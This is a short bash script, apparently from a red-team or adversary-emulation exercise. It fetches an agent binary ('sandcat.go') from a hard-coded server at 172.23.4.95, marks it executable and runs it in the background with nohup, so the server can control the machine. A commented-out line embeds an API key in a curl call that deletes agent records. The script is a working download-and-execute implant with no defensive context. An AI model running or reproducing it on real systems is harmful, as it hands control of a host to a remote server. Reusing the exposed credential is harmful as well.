#! /bin/bash
#while ! curl -H "KEY:redAPIKeySantander22" -X DELETE http://172.23.4.95:2288/api/rest -d '{"index":"agents","paw":"$agent_paw"}' &>/dev/null; do echo "Curl Fail - `date`" && sleep 1; done
server="http://172.23.4.95:2288";
agent=$(curl -svkOJ -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;
nohup ./$agent -server $server &

